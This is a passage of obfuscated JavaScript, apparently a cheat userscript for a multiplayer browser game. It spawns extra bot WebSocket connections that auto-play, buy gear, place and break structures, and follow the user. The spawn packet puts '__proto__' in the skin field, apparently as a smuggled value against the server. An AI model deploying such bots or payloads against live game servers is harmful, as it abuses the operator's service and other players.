      this.teleport = _0x49c355.teleport;
      this.isItem = this.id != undefined;
    };
  }
}
;
class BotObjManager {
  constructor(_0x1afd5c, _0x6ee373) {
    this.disableObj = function (_0x55cc34) {
      _0x55cc34.active = false;
      if (config.anotherVisual) {} else {
        _0x55cc34.alive = false;
      }
    };
    let _0x2c5613;
    this.add = function (_0x5e5cfa, _0x138be2, _0xeb150, _0x28d211, _0x38a4c5, _0x179381, _0x16689d, _0xb0533f, _0x30fda3) {
      _0x2c5613 = _0x6ee373(_0x5e5cfa);
      if (!_0x2c5613) {
        _0x2c5613 = _0x1afd5c.find(_0x28498d => !_0x28498d.active);
        if (!_0x2c5613) {
          _0x2c5613 = new BotObject(_0x5e5cfa);
          _0x1afd5c.push(_0x2c5613);
        }
      }
      if (_0xb0533f) {
        _0x2c5613.sid = _0x5e5cfa;
      }
      _0x2c5613.init(_0x138be2, _0xeb150, _0x28d211, _0x38a4c5, _0x179381, _0x16689d, _0x30fda3);
    };
    this.disableBySid = function (_0x24c67b) {
      let _0x4bf88b = _0x6ee373(_0x24c67b);
      if (_0x4bf88b) {
        this.disableObj(_0x4bf88b);
      }
    };
    this.removeAllItems = function (_0x2a44c2, _0x2a78ba) {
      _0x1afd5c.filter(_0x128e13 => _0x128e13.active && _0x128e13.owner && _0x128e13.owner.sid == _0x2a44c2).forEach(_0x3de80b => this.disableObj(_0x3de80b));
    };
  }
}
;
let botz = [];
function botSpawn(_0x15956e) {
  let _0x427ad2;
  console.log(WS);
  let _0x194862 = WS.url.split("wss://")[1].split("?")[0];
  _0x427ad2 = _0x15956e && new WebSocket("wss://" + _0x194862 + "?token=re:" + encodeURIComponent(_0x15956e));
  let _0x9300ad = new Map();
  botSkts.push([_0x9300ad]);
  botz.push([_0x427ad2]);
  let _0x473d3b;
  let _0x7422c8 = [];
  let _0x2ce01e = [];
  let _0x2b8302 = {
    x: 0,
    y: 0,
    inGame: false,
    closeSocket: false,
    whyDie: ""
  };
  let _0x58c933 = {
    x: 0,
    y: 0
  };
  let _0x9a8883 = 0;
  let _0x19e97f = new BotObjManager(_0x7422c8, function (_0xaa9252) {
    return findSID(_0x7422c8, _0xaa9252);
  });
  _0x427ad2.binaryType = "arraybuffer";
  _0x427ad2.first = true;
  _0x427ad2.sendWS = function (_0x3b8748) {
    let _0x506fa2 = Array.prototype.slice.call(arguments, 1);
    let _0xc2b5fd = window.msgpack.encode([_0x3b8748, _0x506fa2]);
    _0x427ad2.send(_0xc2b5fd);
  };
  _0x427ad2.spawn = function () {
    _0x427ad2.sendWS("M", {
      name: "Ty Daddy Um",
      moofoll: 1,
      skin: "__proto__"
    });
  };
  _0x427ad2.sendUpgrade = function (_0x45be55) {
    _0x427ad2.sendWS("H", _0x45be55);
  };
  _0x427ad2.place = function (_0x5e0cd9, _0x20497d) {
    try {
      let _0x4bfad1 = items.list[_0x9300ad.items[_0x5e0cd9]];
      if (_0x9300ad.itemCounts[_0x4bfad1.group.id] == undefined ? true : _0x9300ad.itemCounts[_0x4bfad1.group.id] < (config.isSandbox ? 296 : _0x4bfad1.group.limit ? _0x4bfad1.group.limit : 296)) {
        _0x427ad2.sendWS("G", _0x9300ad.items[_0x5e0cd9]);
        _0x427ad2.sendWS("d", 1, _0x20497d);
        _0x427ad2.sendWS("G", _0x9300ad.weaponIndex, true);
      }
    } catch (_0x53fbf1) {}
  };
  _0x427ad2.buye = function (_0x4efcc2, _0x218b22) {
    let _0x430187 = 0;
    if (_0x9300ad.alive && _0x9300ad.inGame) {
      if (_0x218b22 == 0) {
        if (_0x9300ad.skins[_0x4efcc2]) {
          if (_0x9300ad.latestSkin != _0x4efcc2) {
            _0x427ad2.sendWS("c", 0, _0x4efcc2, 0);
          }
        } else {
          let _0x3d34b2 = findID(hats, _0x4efcc2);
          if (_0x3d34b2) {
            if (_0x9300ad.points >= _0x3d34b2.price) {
              _0x427ad2.sendWS("c", 1, _0x4efcc2, 0);
              _0x427ad2.sendWS("c", 0, _0x4efcc2, 0);
            } else if (_0x9300ad.latestSkin != _0x430187) {
              _0x427ad2.sendWS("c", 0, _0x430187, 0);
            }
          } else if (_0x9300ad.latestSkin != _0x430187) {
            _0x427ad2.sendWS("c", 0, _0x430187, 0);
          }
        }
      } else if (_0x218b22 == 1) {
        if (_0x9300ad.tails[_0x4efcc2]) {
          if (_0x9300ad.latestTail != _0x4efcc2) {
            _0x427ad2.sendWS("c", 0, _0x4efcc2, 1);
          }
        } else {
          let _0x1ff293 = findID(accessories, _0x4efcc2);
          if (_0x1ff293) {
            if (_0x9300ad.points >= _0x1ff293.price) {
              _0x427ad2.sendWS("c", 1, _0x4efcc2, 1);
              _0x427ad2.sendWS("c", 0, _0x4efcc2, 1);
            } else if (_0x9300ad.latestTail != 0) {
              _0x427ad2.sendWS("c", 0, 0, 1);
            }
          } else if (_0x9300ad.latestTail != 0) {
            _0x427ad2.sendWS("c", 0, 0, 1);
          }
        }
      }
    }
  };
  _0x427ad2.fastGear = function () {
    if (_0x9300ad.y2 >= config.mapScale / 2 - config.riverWidth / 2 && _0x9300ad.y2 <= config.mapScale / 2 + config.riverWidth / 2) {
      _0x427ad2.buye(31, 0);
    } else if (_0x9300ad.y2 <= config.snowBiomeTop) {
      _0x427ad2.buye(15, 0);
    } else {
      _0x427ad2.buye(12, 0);
    }
  };
  _0x427ad2.selectWeapon = function (_0x542760) {
    packet("G", _0x542760, 1);
  };
  function _0x3cce5f(_0x292d5b, _0x90f63e) {
    try {
      return Math.atan2((_0x90f63e.y2 || _0x90f63e.y) - (_0x292d5b.y2 || _0x292d5b.y), (_0x90f63e.x2 || _0x90f63e.x) - (_0x292d5b.x2 || _0x292d5b.x));
    } catch (_0x416de4) {
      return 0;
    }
  }
  _0x427ad2.heal = function () {
    if (_0x9300ad.health < 100) {
      _0x427ad2.place(0, 0);
    }
  };
  let _0x164cac = "no";
  _0x427ad2.zync = function (_0x11d0fc) {
    if (!_0x9300ad.millPlace) {
      _0x164cac = "yeah";
      _0x427ad2.place(5, _0x3cce5f(_0x9300ad, _0x11d0fc));
      let _0x57bd7d = {
        x: _0x9300ad.x + Math.cos(_0x3cce5f(_0x11d0fc, _0x9300ad) - Math.PI) * 80,
        y: _0x9300ad.y + Math.sin(_0x3cce5f(_0x11d0fc, _0x9300ad) - Math.PI) * 80,
        x2: _0x9300ad.x + Math.cos(_0x3cce5f(_0x11d0fc, _0x9300ad) - Math.PI) * 80,
        y2: _0x9300ad.y + Math.sin(_0x3cce5f(_0x11d0fc, _0x9300ad) - Math.PI) * 80
      };
      function _0x183e63(_0x594433, _0x12b9d2, _0x372f1d, _0x44cc2d) {
        let _0x25ebed = Math.sqrt(Math.pow(_0x372f1d - _0x594433, 2) + Math.pow(_0x44cc2d - _0x12b9d2, 2));
        return _0x25ebed;
      }
      function _0x4bee3() {

        _0x427ad2.sendWS("D", _0x3cce5f(_0x11d0fc, _0x9300ad) - Math.PI);
      }
      let _0x3b7e17 = setInterval(() => {
        _0x427ad2.sendWS("G", _0x9300ad.weapons[1], true);
        if (_0x9a8883 == 0) {
          _0x427ad2.sendWS("K", 1);
          _0x9a8883 = 1;
        }
        setTimeout(() => {
          _0x427ad2.sendWS("G", _0x9300ad.weapons[0], true);
        }, 2000);
        _0x427ad2.buye(53, 0);
        if (_0x183e63(_0x57bd7d.x, _0x57bd7d.y, _0x9300ad.x, _0x9300ad.y) > 5) {
          _0x427ad2.sendWS("a", _0x3cce5f(_0x9300ad, _0x57bd7d));
        } else {

          _0x164cac = "no";
          _0x427ad2.sendWS("a", undefined);
          _0x4bee3();
          clearInterval(_0x3b7e17);
        }
      }, 150);
      setTimeout(() => {
        _0x164cac = "no";
        clearInterval(_0x3b7e17);
      }, 500);
    }
  };
  _0x427ad2.onmessage = function (_0x286df1) {
    let _0x713409 = new Uint8Array(_0x286df1.data);
    let _0x5c4031 = window.msgpack.decode(_0x713409);
    let _0x229dde = _0x5c4031[0];
    _0x713409 = _0x5c4031[1];
    if (_0x229dde == "io-init") {
      _0x427ad2.spawn();
    }
    if (_0x229dde == "1") {
      _0x473d3b = _0x713409[0];
      console.log(_0x473d3b);
    }
    if (_0x229dde == "D") {
      if (_0x713409[1]) {
        _0x9300ad = new Bot(_0x713409[0][0], _0x713409[0][1], hats, accessories);
        _0x9300ad.setData(_0x713409[0]);
        _0x9300ad.inGame = true;
        _0x9300ad.alive = true;
        _0x9300ad.x2 = undefined;
        _0x9300ad.y2 = undefined;
        _0x9300ad.spawn(1);
        _0x9300ad.oldHealth = 100;
        _0x9300ad.health = 100;
        _0x9300ad.showName = "YEAHHH";
        _0x58c933 = {
          x: _0x713409[0][3],
          y: _0x713409[0][4]
        };
        _0x2b8302.inGame = true;
        if (_0x427ad2.first) {
          _0x427ad2.first = false;
          bots.push(_0x2b8302);
        }
      }
    }
    if (_0x229dde == "P") {
      _0x427ad2.spawn();
      _0x9300ad.inGame = false;
      _0x2b8302.inGame = false;
    }
    if (_0x229dde == "a") {
      let _0x27111c = _0x713409[0];
      _0x9300ad.tick++;
      _0x9300ad.enemy = [];
      _0x9300ad.near = [];
      _0x427ad2.showName = "YEAHHH";
      _0x2ce01e = [];
      for (let _0x377bc5 = 0; _0x377bc5 < _0x27111c.length;) {
        if (_0x27111c[_0x377bc5] == _0x9300ad.sid) {
          _0x9300ad.x2 = _0x27111c[_0x377bc5 + 1];
          _0x9300ad.y2 = _0x27111c[_0x377bc5 + 2];
          _0x9300ad.d2 = _0x27111c[_0x377bc5 + 3];
          _0x9300ad.buildIndex = _0x27111c[_0x377bc5 + 4];
          _0x9300ad.weaponIndex = _0x27111c[_0x377bc5 + 5];
          _0x9300ad.weaponVariant = _0x27111c[_0x377bc5 + 6];
          _0x9300ad.team = _0x27111c[_0x377bc5 + 7];
          _0x9300ad.isLeader = _0x27111c[_0x377bc5 + 8];
          _0x9300ad.skinIndex = _0x27111c[_0x377bc5 + 9];
          _0x9300ad.tailIndex = _0x27111c[_0x377bc5 + 10];
          _0x9300ad.iconIndex = _0x27111c[_0x377bc5 + 11];
          _0x9300ad.zIndex = _0x27111c[_0x377bc5 + 12];
          _0x9300ad.visible = true;
          _0x2b8302.x2 = _0x9300ad.x2;
          _0x2b8302.y2 = _0x9300ad.y2;
        }
        _0x377bc5 += 13;
      }
      for (let _0x408890 = 0; _0x408890 < _0x27111c.length;) {
        tmpObj = findPlayerBySID(_0x27111c[_0x408890]);
        if (tmpObj) {
          if (!tmpObj.isTeam(_0x9300ad)) {
            enemy.push(tmpObj);
            if (tmpObj.dist2 <= items.weapons[tmpObj.primaryIndex == undefined ? 5 : tmpObj.primaryIndex].range + _0x9300ad.scale * 2) {
              nears.push(tmpObj);
            }
          }
        }
        _0x408890 += 13;
      }
      if (enemy.length) {
        _0x9300ad.near = enemy.sort(function (_0x313e67, _0x3bf824) {
          return _0x313e67.dist2 - _0x3bf824.dist2;
        })[0];
      }
      if (_0x9a8883 == 1) {
        _0x427ad2.sendWS("K", 1);
        _0x9a8883 = 0;
      }
      if (_0x2b8302.closeSocket) {
        _0x9300ad.closeSockets(_0x427ad2);
      }
      if (_0x2b8302.whyDie != "") {
        _0x9300ad.whyDieChat(_0x427ad2, _0x2b8302.whyDie);
        _0x2b8302.whyDie = "";
      }
      if (_0x9300ad.alive) {
        if (player.team) {
          if (_0x9300ad.team != player.team && _0x9300ad.tick % 9 === 0) {
            if (_0x9300ad.team) {
              _0x427ad2.sendWS("N");
            }
            _0x427ad2.sendWS("b", player.team);
          }
        }
        let _0x54d375 = items.list[_0x9300ad.items[3]];
        let _0xfb6cc = _0x9300ad.itemCounts[_0x54d375.group.id];
        if ((_0xfb6cc != undefined ? _0xfb6cc : 0) < 201 && _0x9300ad.millPlace) {
          if (_0x9300ad.inGame) {
            _0x427ad2.sendWS("D", _0x9300ad.moveDir);
            if (_0x9a8883 == 0) {
              _0x427ad2.sendWS("K", 1);
              _0x9a8883 = 1;
            }
            if (UTILS.getDist(_0x58c933, _0x9300ad, 0, 2) > 90) {
              let _0x2a8bc5 = UTILS.getDirect(_0x58c933, _0x9300ad, 0, 2);
              _0x427ad2.place(3, _0x2a8bc5 + 7.7);
              _0x427ad2.place(3, _0x2a8bc5 - 7.7);
              _0x427ad2.place(3, _0x2a8bc5);
              _0x58c933 = {
                x: _0x9300ad.x2,
                y: _0x9300ad.y2
              };
            }
            if (_0x9300ad.tick % 90 === 0) {
              let _0x3827bb = Math.random() * Math.PI * 2;
              _0x9300ad.moveDir = _0x3827bb;
              _0x427ad2.sendWS("a", _0x9300ad.moveDir);
            }
          }
          _0x427ad2.fastGear();
        } else if ((_0xfb6cc != undefined ? _0xfb6cc : 0) > 296 && _0x9300ad.millPlace) {
          _0x9300ad.millPlace = false;
          _0x427ad2.fastGear();
        } else if (_0x9300ad.inGame) {
          if (_0x7422c8.length > 0) {
            let _0x197c34 = _0x7422c8.filter(_0x2b26b5 => _0x2b26b5.active && _0x2b26b5.isItem && UTILS.getDist(_0x2b26b5, player, 0, 2) <= 600);
            if (getEl("mode").value == "fuckemup") {
              _0x427ad2.selectWeapon(_0x9300ad.weapons[1]);
              let _0x376c70 = UTILS.getDist(_0x197c34[0], _0x9300ad, 0, 2);
              let _0x41b417 = UTILS.getDirect(_0x197c34[0], _0x9300ad, 0, 2);
              _0x2ce01e = _0x7422c8.filter(_0x553ada => _0x553ada.active && (findSID(_0x197c34, _0x553ada.sid) ? true : !_0x553ada.trap || player.sid != _0x553ada.owner.sid && !player.findAllianceBySid(_0x553ada.owner.sid)) && _0x553ada.isItem && UTILS.getDist(_0x553ada, _0x9300ad, 0, 2) <= items.weapons[_0x9300ad.weaponIndex].range + _0x553ada.scale + 10).sort(function (_0x3ca155, _0x375c37) {
                return UTILS.getDist(_0x3ca155, _0x9300ad, 0, 2) - UTILS.getDist(_0x375c37, _0x9300ad, 0, 2);
              })[0];
              if (_0x2ce01e) {
                let _0x5c32a2 = UTILS.getDist(_0x197c34[0], _0x2ce01e, 0, 0);
                if (_0x376c70 - _0x5c32a2 > 0) {
                  if (findSID(_0x197c34, _0x2ce01e.sid) ? true : _0x2ce01e.dmg || _0x2ce01e.trap) {
                    if (_0x9300ad.moveDir != undefined) {
                      _0x9300ad.moveDir = undefined;
                      _0x427ad2.sendWS("a", _0x9300ad.moveDir);
                      _0x427ad2.sendWS("D", _0x9300ad.nDir);
                    }
                  } else {
                    _0x9300ad.moveDir = _0x41b417;
                    _0x427ad2.sendWS("a", _0x9300ad.moveDir);
                    _0x427ad2.sendWS("D", _0x9300ad.nDir);
                  }
                  if (_0x9300ad.nDir != UTILS.getDirect(_0x2ce01e, _0x9300ad, 0, 2)) {
                    _0x9300ad.nDir = UTILS.getDirect(_0x2ce01e, _0x9300ad, 0, 2);
                    _0x427ad2.sendWS("D", _0x9300ad.nDir);
                  }
                  if (_0x9a8883 == 0) {
                    _0x427ad2.sendWS("K", 1);
                    _0x9a8883 = 1;
                  }
                  _0x427ad2.buye(40, 0);
                } else {
                  _0x9300ad.moveDir = _0x41b417;
                  _0x427ad2.sendWS("a", _0x9300ad.moveDir);
                  _0x427ad2.sendWS("D", _0x9300ad.nDir);
                  _0x427ad2.fastGear();
                }
              } else {
                _0x9300ad.moveDir = _0x41b417;
                _0x427ad2.sendWS("a", _0x9300ad.moveDir);
                _0x427ad2.sendWS("D", _0x9300ad.nDir);
                _0x427ad2.fastGear();
              }
            }
          }
          if (_0x7422c8.length > 0) {
            if (getEl("mode").value == "flex") {
              const _0x398413 = _0x9300ad.sid * (Math.PI * 2 / _0x9300ad.sid);
              const _0xadca2d = Math.cos(Date.now() * 0.01) * 300 + player.x;
              const _0x460a86 = Math.sin(Date.now() * 0.01) * 300 + player.x;
              _0x427ad2.sendWS("a", Math.atan2(_0x460a86 - _0x9300ad.y, _0xadca2d - _0x9300ad.x));
              const _0x1b37c6 = Math.hypot(_0xadca2d - _0x9300ad.x, _0x460a86 - _0x9300ad.y);
              if (_0x1b37c6 > 22) {
                return;
              }
            }
          }
          if (_0x7422c8.length > 0) {
            _0x2ce01e = _0x7422c8.filter(_0x37d7be => _0x37d7be.active && _0x37d7be.isItem && UTILS.getDist(_0x37d7be, _0x9300ad, 0, 2) <= items.weapons[_0x9300ad.weaponIndex].range).sort(function (_0x4277ec, _0x172faa) {
              return UTILS.getDist(_0x4277ec, _0x9300ad, 0, 2) - UTILS.getDist(_0x172faa, _0x9300ad, 0, 2);
            })[0];
            if (_0x2ce01e) {
              if (_0x9a8883 == 0) {
                _0x427ad2.sendWS("K", 1);
                _0x9a8883 = 1;
              }
              if (_0x9300ad.nDir != UTILS.getDirect(_0x2ce01e, _0x9300ad, 0, 2)) {
                _0x9300ad.nDir = UTILS.getDirect(_0x2ce01e, _0x9300ad, 0, 2);
                _0x427ad2.sendWS("D", _0x9300ad.nDir);
              }
              _0x427ad2.buye(40, 0);
              _0x427ad2.buye(11, 1);
            } else {
              _0x427ad2.fastGear();
              _0x427ad2.buye(11, 1);
            }
            _0x427ad2.buye(11, 1);
            if (breakObjects.length > 0 && getEl("mode").value == "clear") {
              _0x427ad2.selectWeapon(_0x9300ad.weapons[1]);
              let _0x385665 = UTILS.getDist(breakObjects[0], _0x9300ad, 0, 2);
              let _0x2daed9 = UTILS.getDirect(breakObjects[0], _0x9300ad, 0, 2);
              _0x2ce01e = _0x7422c8.filter(_0x4a7744 => _0x4a7744.active && (findSID(breakObjects, _0x4a7744.sid) ? true : !_0x4a7744.trap || player.sid != _0x4a7744.owner.sid && !player.findAllianceBySid(_0x4a7744.owner.sid)) && _0x4a7744.isItem && UTILS.getDist(_0x4a7744, _0x9300ad, 0, 2) <= items.weapons[_0x9300ad.weaponIndex].range + _0x4a7744.scale).sort(function (_0x3f083c, _0x159e09) {
                return UTILS.getDist(_0x3f083c, _0x9300ad, 0, 2) - UTILS.getDist(_0x159e09, _0x9300ad, 0, 2);
              })[0];
              if (_0x2ce01e) {
                let _0x1886da = UTILS.getDist(breakObjects[0], _0x2ce01e, 0, 0);
                if (_0x385665 - _0x1886da > 0) {
                  if (findSID(breakObjects, _0x2ce01e.sid) ? true : _0x2ce01e.dmg || _0x2ce01e.trap) {
                    if (_0x9300ad.moveDir != undefined) {
                      _0x9300ad.moveDir = undefined;
                      _0x427ad2.sendWS("a", _0x9300ad.moveDir);
                      _0x427ad2.sendWS("D", _0x9300ad.nDir);
                    }
                  } else {
                    _0x9300ad.moveDir = _0x2daed9;
                    _0x427ad2.sendWS("a", _0x9300ad.moveDir);
                    _0x427ad2.sendWS("D", _0x9300ad.nDir);
                  }
                  if (_0x9300ad.nDir != UTILS.getDirect(_0x2ce01e, _0x9300ad, 0, 2)) {
                    _0x9300ad.nDir = UTILS.getDirect(_0x2ce01e, _0x9300ad, 0, 2);
                    _0x427ad2.sendWS("D", _0x9300ad.nDir);
                  }
                  if (_0x9a8883 == 0) {
                    _0x427ad2.sendWS("K", 1);
                    _0x9a8883 = 1;
                  }
                  _0x427ad2.buye(40, 0);
                  _0x427ad2.fastGear();
                } else {
                  _0x9300ad.moveDir = _0x2daed9;
                  _0x427ad2.sendWS("a", _0x9300ad.moveDir);
                  _0x427ad2.sendWS("D", _0x9300ad.nDir);
                  _0x427ad2.fastGear();
                }
              } else {
                _0x9300ad.moveDir = _0x2daed9;
                _0x427ad2.sendWS("a", _0x9300ad.moveDir);
                _0x427ad2.sendWS("D", _0x9300ad.nDir);
                _0x427ad2.fastGear();
              }
              if (_0x385665 > 300) {
                if (UTILS.getDist(_0x58c933, _0x9300ad, 0, 2) > 90) {
                  let _0x583a16 = UTILS.getDirect(_0x58c933, _0x9300ad, 0, 2);
                  _0x427ad2.place(3, _0x583a16 + 7.7);
                  _0x427ad2.place(3, _0x583a16 - 7.7);
                  _0x427ad2.place(3, _0x583a16);
                  _0x58c933 = {
                    x: _0x9300ad.x2,
                    y: _0x9300ad.y2
                  };
                }
              }
            }
          }
          if (_0x7422c8.length > 0 && getEl("mode").value == "zync") {
            let _0x2f9547 = _0x7422c8.filter(_0x4921ca => _0x4921ca.active && _0x4921ca.isItem && UTILS.getDist(_0x4921ca, player, 0, 2) <= items.weapons[_0x9300ad.weaponIndex].range + _0x4921ca.scale);
            if (!_0x2f9547.length) {
              if (_0x164cac == "no") {
                _0x427ad2.sendWS("D", UTILS.getDirect(player, _0x9300ad, 0, 2));
              }
              _0x427ad2.sendWS("a", _0x3cce5f(player, _0x9300ad) + Math.PI);
            }
            if (_0x2f9547.length) {
              let _0x33e719 = UTILS.getDist(_0x2f9547[0], _0x9300ad, 0, 2);
              let _0x305074 = UTILS.getDirect(_0x2f9547[0], _0x9300ad, 0, 2);
              _0x2ce01e = _0x7422c8.filter(_0xfdb46f => _0xfdb46f.active && (findSID(_0x2f9547, _0xfdb46f.sid) ? true : !_0xfdb46f.trap || player.sid != _0xfdb46f.owner.sid && !player.findAllianceBySid(_0xfdb46f.owner.sid)) && _0xfdb46f.isItem && UTILS.getDist(_0xfdb46f, _0x9300ad, 0, 2) <= items.weapons[_0x9300ad.weaponIndex].range + _0xfdb46f.scale).sort(function (_0x467029, _0x49c477) {
                return UTILS.getDist(_0x467029, _0x9300ad, 0, 2) - UTILS.getDist(_0x49c477, _0x9300ad, 0, 2);
              })[0];
              if (_0x2ce01e) {
                let _0x303d14 = UTILS.getDist(_0x2f9547[0], _0x2ce01e, 0, 0);
                if (_0x33e719 - _0x303d14 > 0) {
                  if (findSID(_0x2f9547, _0x2ce01e.sid) ? true : _0x2ce01e.dmg || _0x2ce01e.trap) {
                    if (_0x9300ad.moveDir != undefined) {
                      _0x9300ad.moveDir = undefined;
                      _0x427ad2.sendWS("a", _0x9300ad.moveDir);
                      _0x427ad2.sendWS("D", _0x9300ad.nDir);
                    }
                  } else {
                    _0x427ad2.sendWS("D", _0x9300ad.nDir);
                  }
                  if (_0x9300ad.nDir != UTILS.getDirect(_0x2ce01e, _0x9300ad, 0, 2)) {
                    _0x9300ad.nDir = UTILS.getDirect(_0x2ce01e, _0x9300ad, 0, 2);
                    _0x427ad2.sendWS("D", _0x9300ad.nDir);
                  }
                  if (_0x9a8883 == 0) {
                    _0x427ad2.sendWS("K", 1);
                    _0x9a8883 = 1;
                  }
                  _0x427ad2.buye(40, 0);
                  _0x427ad2.fastGear();
                } else {
                  if (_0x164cac == "no") {
                    _0x427ad2.sendWS("D", UTILS.getDirect(_0x2ce01e, _0x9300ad, 0, 2));
                  }
                  if (cdf(player, _0x9300ad) <= 110) {
                    _0x427ad2.sendWS("a", undefined);
                  } else {
                    _0x427ad2.sendWS("a", _0x3cce5f(player, _0x9300ad) + Math.PI);
                  }
                }
              } else if (_0x2f9547.length) {
                if (_0x164cac == "no") {
                  _0x427ad2.sendWS("D", UTILS.getDirect(_0x2f9547[0], _0x9300ad, 0, 2));
                }
                if (cdf(player, _0x9300ad) <= 110) {
                  _0x427ad2.sendWS("a", undefined);
                } else {
                  _0x427ad2.sendWS("a", _0x3cce5f(player, _0x9300ad) + Math.PI);
                }
              } else {
                if (_0x164cac == "no") {
                  _0x427ad2.sendWS("D", UTILS.getDirect(player, _0x9300ad, 0, 2));
                }
                if (cdf(player, _0x9300ad) <= 110) {
                  _0x427ad2.sendWS("a", undefined);
                } else {
                  _0x427ad2.sendWS("a", _0x3cce5f(player, _0x9300ad) + Math.PI);
                }
              }
            }
          }
        }
      }
    }
    if (_0x229dde == "H") {
      let _0x5af2b0 = _0x713409[0];
      for (let _0x187578 = 0; _0x187578 < _0x5af2b0.length;) {
        _0x19e97f.add(_0x5af2b0[_0x187578], _0x5af2b0[_0x187578 + 1], _0x5af2b0[_0x187578 + 2], _0x5af2b0[_0x187578 + 3], _0x5af2b0[_0x187578 + 4], _0x5af2b0[_0x187578 + 5], items.list[_0x5af2b0[_0x187578 + 6]], true, _0x5af2b0[_0x187578 + 7] >= 0 ? {
          sid: _0x5af2b0[_0x187578 + 7]
        } : null);
        _0x187578 += 8;
      }
    }
    if (_0x229dde == "N") {
      let _0x1d8014 = _0x713409[0];
      let _0x1634a8 = _0x713409[1];
      if (_0x9300ad) {
        _0x9300ad[_0x1d8014] = _0x1634a8;
      }
    }
    if (_0x229dde == "O") {
      if (_0x713409[0] == _0x9300ad.sid) {
        _0x9300ad.oldHealth = _0x9300ad.health;
        _0x9300ad.health = _0x713409[1];
        _0x9300ad.judgeShame();
        if (_0x9300ad.oldHealth > _0x9300ad.health) {
          if (_0x9300ad.shameCount < 5) {
            for (let _0x371398 = 0; _0x371398 < 2; _0x371398++) {
              _0x427ad2.place(0, _0x9300ad.nDir);
            }
          } else {
            setTimeout(() => {
              for (let _0x4b3f1b = 0; _0x4b3f1b < 2; _0x4b3f1b++) {
                _0x427ad2.place(0, _0x9300ad.nDir);
              }
            }, 95);
          }
        }
      }
    }
    if (_0x229dde == "Q") {
      let _0x37efff = _0x713409[0];
      _0x19e97f.disableBySid(_0x37efff);
    }
    if (_0x229dde == "R") {
      let _0x3924d6 = _0x713409[0];
      if (_0x9300ad.alive) {
        _0x19e97f.removeAllItems(_0x3924d6);
      }
    }
    if (_0x229dde == "S") {
      let _0x906013 = _0x713409[0];
      let _0x4d78cb = _0x713409[1];
      if (_0x9300ad) {
        _0x9300ad.itemCounts[_0x906013] = _0x4d78cb;
      }
    }
    if (_0x229dde == "U") {
      if (_0x713409[0] > 0) {
        if (getEl("setup").value == "dm") {
          if (_0x9300ad.upgraded == 0) {
            _0x427ad2.sendUpgrade(7);
          } else if (_0x9300ad.upgraded == 1) {
            _0x427ad2.sendUpgrade(17);
          } else if (_0x9300ad.upgraded == 2) {
            _0x427ad2.sendUpgrade(31);
          } else if (_0x9300ad.upgraded == 3) {
            _0x427ad2.sendUpgrade(23);
          } else if (_0x9300ad.upgraded == 4) {
            _0x427ad2.sendUpgrade(9);
          } else if (_0x9300ad.upgraded == 5) {
            _0x427ad2.sendUpgrade(34);
          } else if (_0x9300ad.upgraded == 6) {
            _0x427ad2.sendUpgrade(12);
          } else if (_0x9300ad.upgraded == 7) {
            _0x427ad2.sendUpgrade(15);
          }
        } else if (getEl("setup").value == "dr") {
          if (_0x9300ad.upgraded == 0) {
            _0x427ad2.sendUpgrade(7);
          } else if (_0x9300ad.upgraded == 1) {
            _0x427ad2.sendUpgrade(17);
          } else if (_0x9300ad.upgraded == 2) {
            _0x427ad2.sendUpgrade(31);
          } else if (_0x9300ad.upgraded == 3) {
            _0x427ad2.sendUpgrade(23);
          } else if (_0x9300ad.upgraded == 4) {
            _0x427ad2.sendUpgrade(9);
          } else if (_0x9300ad.upgraded == 5) {
            _0x427ad2.sendUpgrade(34);
          } else if (_0x9300ad.upgraded == 6) {
            _0x427ad2.sendUpgrade(12);
          } else if (_0x9300ad.upgraded == 7) {
            _0x427ad2.sendUpgrade(13);
          }
        } else if (getEl("setup").value == "kh") {
          if (_0x9300ad.upgraded == 0) {
            _0x427ad2.sendUpgrade(3);
          } else if (_0x9300ad.upgraded == 1) {
            _0x427ad2.sendUpgrade(17);
          } else if (_0x9300ad.upgraded == 2) {
            _0x427ad2.sendUpgrade(31);
          } else if (_0x9300ad.upgraded == 3) {
            _0x427ad2.sendUpgrade(27);
          } else if (_0x9300ad.upgraded == 4) {
            _0x427ad2.sendUpgrade(10);
          } else if (_0x9300ad.upgraded == 5) {
            _0x427ad2.sendUpgrade(34);
          } else if (_0x9300ad.upgraded == 6) {
            _0x427ad2.sendUpgrade(4);
          } else if (_0x9300ad.upgraded == 7) {
            _0x427ad2.sendUpgrade(25);
          }
        } else if (getEl("setup").value == "zd") {
          if (_0x9300ad.upgraded == 0) {
            _0x427ad2.sendUpgrade(3);
          } else if (_0x9300ad.upgraded == 1) {
            _0x427ad2.sendUpgrade(17);
          } else if (_0x9300ad.upgraded == 2) {
            _0x427ad2.sendUpgrade(31);
          } else if (_0x9300ad.upgraded == 3) {
            _0x427ad2.sendUpgrade(27);
          } else if (_0x9300ad.upgraded == 4) {
            _0x427ad2.sendUpgrade(9);
          } else if (_0x9300ad.upgraded == 5) {
            _0x427ad2.sendUpgrade(34);
          } else if (_0x9300ad.upgraded == 6) {
            _0x427ad2.sendUpgrade(12);
          } else if (_0x9300ad.upgraded == 7) {
            _0x427ad2.sendUpgrade(15);
          }
        }
        _0x9300ad.upgraded++;
      }
    }
    if (_0x229dde == "V") {
      let _0x45085b = _0x713409[0];
      let _0x3e22a7 = _0x713409[1];
      if (_0x45085b) {
        if (_0x3e22a7) {
          _0x9300ad.weapons = _0x45085b;
        } else {
          _0x9300ad.items = _0x45085b;
        }
      }
    }
    if (_0x229dde == "5") {
      let _0x3356e5 = _0x713409[0];
      let _0x1a51a4 = _0x713409[1];
      let _0x5c98aa = _0x713409[2];
      if (_0x5c98aa) {
        if (!_0x3356e5) {
          _0x9300ad.tails[_0x1a51a4] = 1;
        } else {
          _0x9300ad.latestTail = _0x1a51a4;
        }
      } else if (!_0x3356e5) {
        _0x9300ad.skins[_0x1a51a4] = 1;
      } else {
        _0x9300ad.latestSkin = _0x1a51a4;
      }
    }
    if (_0x229dde == "6") {
      let _0x284ae2 = _0x713409[0];
      let _0x4c1223 = _0x713409[1] + "";
      if (_0x284ae2 == player.sid && _0x4c1223.includes("*sneeze*")) {
        _0x427ad2.zync(_0x9300ad.near);
      }
    }
  };
  _0x427ad2.onclose = function () {
    _0x9300ad.inGame = false;
    _0x2b8302.inGame = false;
  };
}
function renderLeaf(_0x24ce8e, _0x15652b, _0x27c9e3, _0x131775, _0x556743) {
  let _0xf28c90 = _0x24ce8e + _0x27c9e3 * Math.cos(_0x131775);
  let _0x1cc4f8 = _0x15652b + _0x27c9e3 * Math.sin(_0x131775);
  let _0x3534 = _0x27c9e3 * 0.4;
  _0x556743.moveTo(_0x24ce8e, _0x15652b);
